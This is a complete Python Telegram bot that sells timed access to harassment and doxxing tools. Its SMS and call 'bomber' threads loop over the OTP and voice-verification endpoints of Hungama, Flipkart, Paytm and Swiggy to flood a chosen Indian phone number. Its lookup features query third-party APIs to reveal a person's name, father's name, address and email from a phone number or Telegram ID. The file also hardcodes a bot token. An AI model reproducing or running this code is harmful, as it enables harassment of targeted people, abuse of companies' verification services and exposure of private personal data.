import requests
import time
import json
import random
import threading
import os
from datetime import datetime, timedelta

# ========= CONFIGURATION =========
BOT_TOKEN = "8641115883:AAEfUun26pFq_eR_0kCcuqPORtm6X6NGd9Q"
CHANNEL_LINK = "https://t.me/+Wk8eHoxNYs1lYjM1"
CHANNEL_USERNAME = "Dark_hac_kerr"
OWNER_ID = 7201893742
OWNER_USERNAME = "@M_JITENDRA"
DEVELOPER = "@M_JITENDRA"

PROTECTED_NUMBER = "khali rakhna"
PROTECTED_TG_ID = "khali rakhna"
PROTECTED_TG_USERNAME = "khali rakhna"

WARNING_MSG = "ACCESS DENIED - Protected number!"

# ========= DATA FILES =========
USERS_FILE = "users_data.json"
PENDING_FILE = "pending_verification.json"
USERS_EXPIRY_FILE = "users_expiry.json"
LOOKUP_FILE = "tg-lookup.json"

# ========= API URL =========
RAILWAY_API_URL = "https://node-production-1649.up.railway.app/api/tg-lookup?key=ERAAA&term="

# ========= DATA STRUCTURES =========
USERS = set()
PENDING_USERS = {}
USERS_EXPIRY = {}
CACHE = {}
BOMBING_ACTIVE = {}
BOMBING_STATS = {}

# ========= LOAD/SAVE =========
def load_data():
    global USERS, PENDING_USERS, USERS_EXPIRY
    try:
        with open(USERS_FILE, "r") as f:
            data = json.load(f)
            USERS = set(data.get("users", []))
    except:
        USERS = set()
    
    try:
        with open(PENDING_FILE, "r") as f:
            PENDING_USERS = json.load(f)
    except:
        PENDING_USERS = {}
    
    try:
        with open(USERS_EXPIRY_FILE, "r") as f:
            USERS_EXPIRY = json.load(f)
    except:
        USERS_EXPIRY = {}

def save_data():
    with open(USERS_FILE, "w") as f:
        json.dump({"users": list(USERS)}, f)
    with open(PENDING_FILE, "w") as f:
        json.dump(PENDING_USERS, f)
    with open(USERS_EXPIRY_FILE, "w") as f:
        json.dump(USERS_EXPIRY, f)

# ========= TG ID TO NUMBER - EXACT OUTPUT FORMAT =========
def tgid_to_number_from_api(userid):
    """Fetch from Railway API and convert to exact format"""
    try:
        url = RAILWAY_API_URL + str(userid)
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get("success") and "result" in data:
                result = data["result"]
                # Return in EXACT format
                return {
                    "data": {
                        "chat_id": result.get("tg_id", ""),
                        "country": result.get("country", "India"),
                        "country_code": result.get("country_code", "+91"),
                        "message": result.get("msg", "Details fetched"),
                        "number": result.get("number", "N/A")
                    },
                    "success": True
                }
        return None
    except Exception as e:
        print(f"API Error: {e}")
        return None

def tgid_to_number_from_file(userid):
    """Get number from local tg-lookup.json file and convert to exact format"""
    try:
        if not os.path.exists(LOOKUP_FILE):
            return None
        
        with open(LOOKUP_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        if data.get("success") and "result" in data:
            result = data["result"]
            tg_id = result.get("tg_id", "")
            
            if str(userid) == str(tg_id):
                return {
                    "data": {
                        "chat_id": result.get("tg_id", ""),
                        "country": result.get("country", "India"),
                        "country_code": result.get("country_code", "+91"),
                        "message": result.get("msg", "Details fetched"),
                        "number": result.get("number", "N/A")
                    },
                    "success": True
                }
        return None
    except Exception as e:
        print(f"File Error: {e}")
        return None

def tgid_to_number(userid):
    """Main function - try local file first, then API"""
    # Check if protected
    if str(userid) == PROTECTED_TG_ID or str(userid).lower() == PROTECTED_TG_USERNAME.lower():
        return "PROTECTED"
    
    # First try local file
    result = tgid_to_number_from_file(userid)
    if result:
        return result
    
    # If not found in local file, try API
    result = tgid_to_number_from_api(userid)
    if result:
        return result
    
    return None

# ========= TELEGRAM API =========
def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 25, "allowed_updates": ["message", "callback_query"]}
    if offset:
        params["offset"] = offset
    try:
        response = requests.get(url, params=params, timeout=30)
        return response.json().get("result", [])
    except:
        return []

def get_user_info(user_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
    params = {"chat_id": user_id}
    try:
        response = requests.get(url, params=params, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                result = data.get("result", {})
                return {
                    "first_name": result.get("first_name", "Unknown"),
                    "username": result.get("username", ""),
                    "user_id": user_id
                }
        return None
    except:
        return None

# ========= EXPIRY CHECK =========
def is_user_expired(user_id):
    if user_id == OWNER_ID:
        return False
    if str(user_id) in USERS_EXPIRY:
        expiry = USERS_EXPIRY[str(user_id)].get("expiry", 0)
        if expiry > time.time():
            return False
        else:
            if user_id in USERS:
                USERS.remove(user_id)
            save_data()
            return True
    return True

def is_verified(chat_id):
    if chat_id == OWNER_ID:
        return True
    if chat_id in USERS and not is_user_expired(chat_id):
        return True
    return False

def get_days_left(user_id):
    if str(user_id) in USERS_EXPIRY:
        expiry = USERS_EXPIRY[str(user_id)].get("expiry", 0)
        if expiry > time.time():
            return int((expiry - time.time()) / (24*60*60))
    return 0

# ========= KEYBOARDS =========
def main_keyboard():
    return {
        "keyboard": [
            ["📞 NUMBER LOOKUP", "🆔 TG ID TO NUMBER"],
            ["💣 SMS BOMBER", "📞 CALL BOMBER"],
            ["📊 STATS", "🛑 STOP BOMB"],
            ["✅ VERIFY ME", "📢 CHANNEL"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def owner_keyboard():
    return {
        "keyboard": [
            ["📞 NUMBER LOOKUP", "🆔 TG ID TO NUMBER"],
            ["💣 SMS BOMBER", "📞 CALL BOMBER"],
            ["📊 STATS", "🛑 STOP BOMB"],
            ["✅ VERIFY ME", "📢 CHANNEL"],
            ["👑 PENDING", "👑 ADD USER"],
            ["👑 REMOVE USER", "👑 TOTAL USERS"],
            ["📢 BROADCAST"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def verification_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "✅ SEND REQUEST", "callback_data": "check_verify"}]
        ]
    }

def owner_verify_keyboard(user_id):
    return {
        "inline_keyboard": [
            [{"text": "✅ ACCEPT", "callback_data": f"accept_{user_id}"}],
            [{"text": "❌ DECLINE", "callback_data": f"decline_{user_id}"}]
        ]
    }

def days_keyboard(user_id):
    return {
        "inline_keyboard": [
            [{"text": "📅 7 DAYS", "callback_data": f"days_7_{user_id}"}, {"text": "📅 15 DAYS", "callback_data": f"days_15_{user_id}"}],
            [{"text": "📅 30 DAYS", "callback_data": f"days_30_{user_id}"}, {"text": "📅 60 DAYS", "callback_data": f"days_60_{user_id}"}],
            [{"text": "📅 90 DAYS", "callback_data": f"days_90_{user_id}"}, {"text": "📅 180 DAYS", "callback_data": f"days_180_{user_id}"}],
            [{"text": "📅 365 DAYS", "callback_data": f"days_365_{user_id}"}]
        ]
    }

# ========= VERIFICATION =========
def send_verification_to_owner(user_id, username, first_name):
    user_info = get_user_info(user_id)
    if user_info:
        first_name = user_info.get('first_name', first_name)
        username = user_info.get('username', username)
    
    username_display = f"@{username}" if username else "No username"
    
    request_text = f"""🔔 NEW REQUEST 🔔
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 {first_name}
🆔 <code>{user_id}</code>
📝 {username_display}
⏰ {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👇 Press ACCEPT"""

    send_telegram_message(OWNER_ID, request_text, owner_verify_keyboard(user_id))

def accept_user_with_expiry(user_id, days):
    expiry_time = time.time() + (days * 24 * 60 * 60)
    
    USERS_EXPIRY[str(user_id)] = {
        "expiry": expiry_time,
        "added_by": OWNER_ID,
        "days": days,
        "added_on": time.time()
    }
    USERS.add(user_id)
    
    if str(user_id) in PENDING_USERS:
        del PENDING_USERS[str(user_id)]
    
    save_data()
    
    user_info = get_user_info(user_id)
    first_name = user_info.get('first_name', 'User') if user_info else 'User'
    expiry_date = datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d')
    
    welcome_text = f"""✅ VERIFIED! ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━
Welcome {first_name}!
Access: {days} days
Expires: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━━━
Use buttons below!"""

    send_telegram_message(user_id, welcome_text, main_keyboard())
    send_telegram_message(OWNER_ID, f"✅ User {user_id} verified for {days} days!")

def decline_user(user_id):
    if str(user_id) in PENDING_USERS:
        del PENDING_USERS[str(user_id)]
    save_data()
    send_telegram_message(user_id, "❌ Request declined!")
    send_telegram_message(OWNER_ID, f"❌ User {user_id} declined!")

def add_user_direct(owner_id, user_id, days):
    if owner_id != OWNER_ID:
        return False
    
    expiry_time = time.time() + (days * 24 * 60 * 60)
    
    USERS_EXPIRY[str(user_id)] = {
        "expiry": expiry_time,
        "added_by": owner_id,
        "days": days,
        "added_on": time.time()
    }
    USERS.add(user_id)
    save_data()
    
    user_info = get_user_info(user_id)
    first_name = user_info.get('first_name', 'User') if user_info else 'User'
    expiry_date = datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d')
    
    send_telegram_message(user_id, f"✅ Added by owner!\nAccess: {days} days\nExpires: {expiry_date}\nUse /start", main_keyboard())
    send_telegram_message(owner_id, f"✅ User {user_id} added for {days} days!")
    return True

def remove_user_direct(owner_id, user_id):
    if owner_id != OWNER_ID:
        return False
    
    if str(user_id) in USERS_EXPIRY:
        del USERS_EXPIRY[str(user_id)]
    if user_id in USERS:
        USERS.remove(user_id)
    save_data()
    
    send_telegram_message(user_id, "❌ Access removed!")
    send_telegram_message(owner_id, f"✅ User {user_id} removed!")
    return True

def get_total_users_list(owner_id):
    if owner_id != OWNER_ID:
        return "Unauthorized"
    
    active = 0
    expired = 0
    now = time.time()
    active_list = []
    
    for uid, data in USERS_EXPIRY.items():
        if data.get("added_by") == owner_id:
            if data.get("expiry", 0) > now:
                active += 1
                days_left = int((data["expiry"] - now) / (24*60*60))
                active_list.append(f"🆔 {uid} - {days_left} days left")
            else:
                expired += 1
    
    result = f"📊 YOUR USERS\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Expired: {expired}\n"
    if active_list:
        result += "\n" + "\n".join(active_list[:15])
    return result

def send_verification_panel(chat_id):
    verify_text = f"""🔐 VERIFICATION REQUIRED
━━━━━━━━━━━━━━━━━━━━━━━━━━
Press SEND REQUEST button to request access.
Owner will approve and set access days."""

    send_telegram_message(chat_id, verify_text, verification_keyboard())

# ========= BROADCAST =========
def broadcast_to_users(admin_id, message_text):
    if admin_id != OWNER_ID:
        send_telegram_message(admin_id, "❌ Only owner can broadcast!")
        return None
    
    if not message_text:
        send_telegram_message(admin_id, "📢 Send message to broadcast:")
        return "awaiting_broadcast"
    
    success = 0
    for user_id in USERS:
        try:
            send_telegram_message(user_id, message_text)
            success += 1
            time.sleep(0.05)
        except:
            pass
    
    send_telegram_message(admin_id, f"✅ Sent to {success} users!")
    return None

# ========= API FUNCTIONS =========
def number_lookup_api(num):
    if num == PROTECTED_NUMBER:
        return "PROTECTED"
    try:
        url = f"https://darkietech.site/numapi.php?action=api&key=AKASH&number={num}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list) and len(data) > 0:
                return data
        return None
    except:
        return None

def number_lookup_backup(num):
    if num == PROTECTED_NUMBER:
        return "PROTECTED"
    try:
        url = f"https://num-to-info-ten.vercel.app/?num={num}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("success") and data.get("result", {}).get("success"):
                results = data["result"].get("results", [])
                if results and len(results) > 0:
                    formatted_results = []
                    for item in results:
                        formatted_result = {
                            "NAME": item.get("NAME", "N/A"),
                            "fname": item.get("fname", "N/A"),
                            "ADDRESS": item.get("ADDRESS", "N/A"),
                            "circle": item.get("circle", "N/A"),
                            "MOBILE": item.get("MOBILE", num),
                            "alt": item.get("alt", "N/A"),
                            "id": item.get("id", "N/A"),
                            "email": item.get("email", "N/A")
                        }
                        formatted_results.append(formatted_result)
                    if len(formatted_results) > 0:
                        return formatted_results
        return None
    except:
        return None

# ========= SMS/CALL APIS =========
SMS_APIS = [
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91"}}'},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Swiggy", "url": "https://profile.swiggy.com/api/v3/app/request_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

CALL_APIS = [
    {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

def send_request(api, phone):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        headers.update(api.get("headers", {}))
        url = api["url"] if not callable(api["url"]) else api["url"](phone)
        data = api["data"](phone) if api["data"] and callable(api["data"]) else api["data"]
        
        if api["method"] == "POST":
            response = requests.post(url, json=json.loads(data), headers=headers, timeout=3)
        else:
            response = requests.get(url, headers=headers, timeout=3)
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

def bombing_worker(chat_id, phone, bomb_type):
    BOMBING_ACTIVE[chat_id] = True
    BOMBING_STATS[chat_id] = {"success": 0, "failed": 0, "total": 0}
    apis = CALL_APIS if bomb_type == "call" else SMS_APIS
    
    while BOMBING_ACTIVE.get(chat_id, False):
        for api in apis:
            if not BOMBING_ACTIVE.get(chat_id, False):
                break
            result = send_request(api, phone)
            BOMBING_STATS[chat_id]["total"] += 1
            if result:
                BOMBING_STATS[chat_id]["success"] += 1
            else:
                BOMBING_STATS[chat_id]["failed"] += 1
        time.sleep(0.3)

# ========= MAIN FUNCTION =========
def main():
    load_data()
    
    print("╔════════════════════════════════════════╗")
    print("║     🔥 BOT STARTED SUCCESSFULLY 🔥      ║")
    print("╠════════════════════════════════════════╣")
    print(f"║  OWNER: {OWNER_USERNAME}")
    print(f"║  OWNER ID: {OWNER_ID}")
    print(f"║  USERS: {len(USERS)}")
    print(f"║  PENDING: {len(PENDING_USERS)}")
    print("╠════════════════════════════════════════╣")
    print("║  📁 LOOKUP: LOCAL FILE + API BOTH      ║")
    print("║  🎯 OUTPUT: EXACT JSON FORMAT          ║")
    print("║  🚫 NO @ MENTIONS                      ║")
    print("╠════════════════════════════════════════╣")
    print("║  🚀 BOT RUNNING...                     ║")
    print("╚════════════════════════════════════════╝")
    
    user_states = {}
    last_update_id = 0
    temp_data = {}
    
    while True:
        try:
            updates = get_updates(last_update_id + 1 if last_update_id else None)
            
            for update in updates:
                last_update_id = update.get("update_id")
                
                # Handle callbacks
                callback = update.get("callback_query")
                if callback:
                    chat_id = callback.get("from", {}).get("id")
                    message_id = callback.get("message", {}).get("message_id")
                    callback_data = callback.get("data", "")
                    callback_id = callback.get("id")
                    
                    try:
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                     data={"callback_query_id": callback_id})
                    except:
                        pass
                    
                    if callback_data == "check_verify":
                        if str(chat_id) not in PENDING_USERS:
                            user_info = get_user_info(chat_id)
                            fn = user_info.get('first_name', 'User') if user_info else 'User'
                            un = user_info.get('username', '') if user_info else ''
                            send_verification_to_owner(chat_id, un, fn)
                            PENDING_USERS[str(chat_id)] = {"first_name": fn, "username": un, "timestamp": time.time()}
                            save_data()
                            send_telegram_message(chat_id, "✅ Request sent to owner!")
                            try:
                                edit_telegram_message(chat_id, message_id, "✅ Request sent! Wait for owner.")
                            except:
                                pass
                        else:
                            send_telegram_message(chat_id, "⏳ Request already pending!")
                    
                    elif callback_data.startswith("accept_"):
                        if chat_id == OWNER_ID:
                            target_id = int(callback_data.split("_")[1])
                            temp_data["accept_user"] = target_id
                            send_telegram_message(chat_id, f"Select days for user {target_id}:", days_keyboard(target_id))
                            try:
                                edit_telegram_message(chat_id, message_id, f"📅 Select days for user {target_id}")
                            except:
                                pass
                    
                    elif callback_data.startswith("decline_"):
                        if chat_id == OWNER_ID:
                            target_id = int(callback_data.split("_")[1])
                            decline_user(target_id)
                            try:
                                edit_telegram_message(chat_id, message_id, f"❌ User {target_id} declined!")
                            except:
                                pass
                    
                    elif callback_data.startswith("days_"):
                        if chat_id == OWNER_ID:
                            parts = callback_data.split("_")
                            days = int(parts[1])
                            target_id = int(parts[2])
                            accept_user_with_expiry(target_id, days)
                            try:
                                edit_telegram_message(chat_id, message_id, f"✅ User {target_id} verified for {days} days!")
                            except:
                                pass
                    
                    continue
                
                # Handle messages
                message = update.get("message")
                if message:
                    chat_id = message.get("chat", {}).get("id")
                    text = message.get("text", "")
                    username = message.get("from", {}).get("username", "")
                    first_name = message.get("from", {}).get("first_name", "User")
                    
                    if not chat_id:
                        continue
                    
                    # Cancel command
                    if text == "/cancel":
                        if chat_id in user_states:
                            del user_states[chat_id]
                        send_telegram_message(chat_id, "❌ Cancelled!")
                        continue
                    
                    state = user_states.get(chat_id, "")
                    
                    # Check verification for non-owner
                    if not is_verified(chat_id):
                        if text == "/start":
                            send_verification_panel(chat_id)
                            continue
                        elif text == "✅ VERIFY ME":
                            if str(chat_id) in PENDING_USERS:
                                send_telegram_message(chat_id, "⏳ Request already pending!")
                                continue
                            user_info = get_user_info(chat_id)
                            fn = user_info.get('first_name', first_name) if user_info else first_name
                            un = user_info.get('username', username) if user_info else username
                            send_verification_to_owner(chat_id, un, fn)
                            PENDING_USERS[str(chat_id)] = {"username": un, "first_name": fn, "timestamp": time.time()}
                            save_data()
                            send_telegram_message(chat_id, "✅ Request sent to owner!")
                            continue
                        elif text == "📢 CHANNEL":
                            send_telegram_message(chat_id, f"🔗 {CHANNEL_LINK}")
                            continue
                        elif text != "/start":
                            send_verification_panel(chat_id)
                            continue
                    
                    # BROADCAST (Owner only)
                    if state == "awaiting_broadcast" and chat_id == OWNER_ID:
                        if text:
                            broadcast_to_users(chat_id, text)
                            del user_states[chat_id]
                        continue
                    
                    # ADD USER - Stage 1 (Owner only)
                    if state == "awaiting_add_user" and chat_id == OWNER_ID:
                        if text.isdigit():
                            temp_data["add_user_id"] = int(text)
                            send_telegram_message(chat_id, f"Select days for user {text}:", days_keyboard(int(text)))
                            del user_states[chat_id]
                        else:
                            send_telegram_message(chat_id, "❌ Send numeric ID only!")
                        continue
                    
                    # REMOVE USER (Owner only)
                    if state == "awaiting_remove_user" and chat_id == OWNER_ID:
                        if text.isdigit():
                            remove_user_direct(chat_id, int(text))
                            del user_states[chat_id]
                        else:
                            send_telegram_message(chat_id, "❌ Send numeric ID only!")
                        continue
                    
                    # ========= TG ID TO NUMBER - EXACT OUTPUT FORMAT =========
                    if state == "awaiting_tgid" and text.isdigit():
                        send_telegram_message(chat_id, "🆔 Searching...")
                        result = tgid_to_number(userid=text)
                        
                        if result and result != "PROTECTED":
                            # Convert to pretty JSON string
                            json_output = json.dumps(result, indent=2, ensure_ascii=False)
                            send_telegram_message(chat_id, f"<code>{json_output}</code>")
                        else:
                            send_telegram_message(chat_id, f"❌ No data found for TG ID: {text}")
                        
                        user_states[chat_id] = ""
                        continue
                    
                    # NUMBER LOOKUP
                    if state == "awaiting_number" and text.isdigit() and len(text) >= 10:
                        num = text[:10]
                        if num == PROTECTED_NUMBER:
                            send_telegram_message(chat_id, WARNING_MSG)
                            user_states[chat_id] = ""
                            continue
                        
                        send_telegram_message(chat_id, "🔍 Searching...")
                        data = number_lookup_api(num)
                        if not data:
                            data = number_lookup_backup(num)
                        
                        if data and data != "PROTECTED" and isinstance(data, list) and len(data) > 0:
                            result = f"📞 NUMBER LOOKUP\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nTarget: {num}\nRecords: {len(data)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            for i, r in enumerate(data, 1):
                                result += f"\n📋 RECORD {i}\nMobile: {r.get('MOBILE', 'N/A')}\nName: {r.get('NAME', 'N/A')}"
                                if r.get('fname'):
                                    result += f"\nFather: {r.get('fname')}"
                                addr = r.get('ADDRESS', 'N/A')
                                if addr != 'N/A':
                                    result += f"\nAddress: {addr[:60]}"
                                result += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
                            send_telegram_message(chat_id, result[:4000])
                        else:
                            send_telegram_message(chat_id, f"❌ No data for {num}")
                        user_states[chat_id] = ""
                        continue
                    
                    # SMS BOMBER
                    if state == "awaiting_sms" and text.isdigit() and len(text) == 10:
                        if text == PROTECTED_NUMBER:
                            send_telegram_message(chat_id, WARNING_MSG)
                            user_states[chat_id] = ""
                            continue
                        
                        if chat_id in BOMBING_ACTIVE:
                            send_telegram_message(chat_id, "❌ Already bombing!")
                            user_states[chat_id] = ""
                            continue
                        
                        send_telegram_message(chat_id, f"💣 SMS BOMBING STARTED\nTarget: +91{text}\nPress 🛑 STOP to stop")
                        threading.Thread(target=bombing_worker, args=(chat_id, text, "sms"), daemon=True).start()
                        user_states[chat_id] = ""
                        continue
                    
                    # CALL BOMBER
                    if state == "awaiting_call" and text.isdigit() and len(text) == 10:
                        if text == PROTECTED_NUMBER:
                            send_telegram_message(chat_id, WARNING_MSG)
                            user_states[chat_id] = ""
                            continue
                        
                        if chat_id in BOMBING_ACTIVE:
                            send_telegram_message(chat_id, "❌ Already bombing!")
                            user_states[chat_id] = ""
                            continue
                        
                        send_telegram_message(chat_id, f"📞 CALL BOMBING STARTED\nTarget: +91{text}\nPress 🛑 STOP to stop")
                        threading.Thread(target=bombing_worker, args=(chat_id, text, "call"), daemon=True).start()
                        user_states[chat_id] = ""
                        continue
                    
                    # ========= VERIFIED USER MENU =========
                    if text == "/start":
                        USERS.add(chat_id)
                        save_data()
                        
                        days_left = get_days_left(chat_id)
                        days_text = f"\n📅 Days left: {days_left}" if days_left > 0 else ""
                        
                        welcome_text = f"""🔥 WELCOME {first_name} 🔥{days_text}
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 NUMBER LOOKUP
🆔 TG ID TO NUMBER
💣 SMS BOMBER
📞 CALL BOMBER
━━━━━━━━━━━━━━━━━━━━━━━━━━
Use buttons below!"""
                        
                        if chat_id == OWNER_ID:
                            send_telegram_message(chat_id, welcome_text, owner_keyboard())
                        else:
                            send_telegram_message(chat_id, welcome_text, main_keyboard())
                        continue
                    
                    # Owner commands
                    if chat_id == OWNER_ID:
                        if text == "👑 PENDING":
                            if PENDING_USERS:
                                msg = "🔔 PENDING REQUESTS\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                for uid, data in PENDING_USERS.items():
                                    msg += f"🆔 {uid}\n👤 {data.get('first_name', 'Unknown')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                send_telegram_message(chat_id, msg)
                            else:
                                send_telegram_message(chat_id, "✅ No pending requests!")
                            continue
                        
                        if text == "👑 ADD USER":
                            send_telegram_message(chat_id, "Send user ID to add:")
                            user_states[chat_id] = "awaiting_add_user"
                            continue
                        
                        if text == "👑 REMOVE USER":
                            send_telegram_message(chat_id, "Send user ID to remove:")
                            user_states[chat_id] = "awaiting_remove_user"
                            continue
                        
                        if text == "👑 TOTAL USERS":
                            result = get_total_users_list(chat_id)
                            send_telegram_message(chat_id, result)
                            continue
                        
                        if text == "📢 BROADCAST":
                            send_telegram_message(chat_id, "📢 Send message to broadcast:")
                            user_states[chat_id] = "awaiting_broadcast"
                            continue
                    
                    # Common commands for all verified users
                    if text == "📞 NUMBER LOOKUP":
                        send_telegram_message(chat_id, "📞 Send number (10 digits):")
                        user_states[chat_id] = "awaiting_number"
                        continue
                    
                    if text == "🆔 TG ID TO NUMBER":
                        send_telegram_message(chat_id, "🆔 Send Telegram ID:")
                        user_states[chat_id] = "awaiting_tgid"
                        continue
                    
                    if text == "💣 SMS BOMBER":
                        send_telegram_message(chat_id, "💣 Send target number (10 digits):\nPress 🛑 STOP to stop")
                        user_states[chat_id] = "awaiting_sms"
                        continue
                    
                    if text == "📞 CALL BOMBER":
                        send_telegram_message(chat_id, "📞 Send target number (10 digits):\nPress 🛑 STOP to stop")
                        user_states[chat_id] = "awaiting_call"
                        continue
                    
                    if text == "📢 CHANNEL":
                        send_telegram_message(chat_id, f"🔗 {CHANNEL_LINK}")
                        continue
                    
                    if text == "📊 STATS":
                        active_bomb = len([x for x in BOMBING_ACTIVE.values() if x])
                        stats = f"📊 STATS\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👥 Users: {len(USERS)}\n🎯 Active bombs: {active_bomb}\n💣 SMS APIs: {len(SMS_APIS)}\n📞 Call APIs: {len(CALL_APIS)}"
                        send_telegram_message(chat_id, stats)
                        continue
                    
                    if text == "🛑 STOP BOMB":
                        if chat_id in BOMBING_ACTIVE:
                            BOMBING_ACTIVE[chat_id] = False
                            stats = BOMBING_STATS.get(chat_id, {})
                            send_telegram_message(chat_id, f"🛑 STOPPED\n✅ {stats.get('success',0)}\n❌ {stats.get('failed',0)}\n📈 {stats.get('total',0)}")
                            del BOMBING_ACTIVE[chat_id]
                        else:
                            send_telegram_message(chat_id, "❌ No active bomb!")
                        continue
                    
                    if text == "✅ VERIFY ME":
                        if str(chat_id) in PENDING_USERS:
                            send_telegram_message(chat_id, "⏳ Request already pending!")
                            continue
                        user_info = get_user_info(chat_id)
                        fn = user_info.get('first_name', first_name) if user_info else first_name
                        un = user_info.get('username', username) if user_info else username
                        send_verification_to_owner(chat_id, un, fn)
                        PENDING_USERS[str(chat_id)] = {"username": un, "first_name": fn, "timestamp": time.time()}
                        save_data()
                        send_telegram_message(chat_id, "✅ Request sent to owner!")
                        continue
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
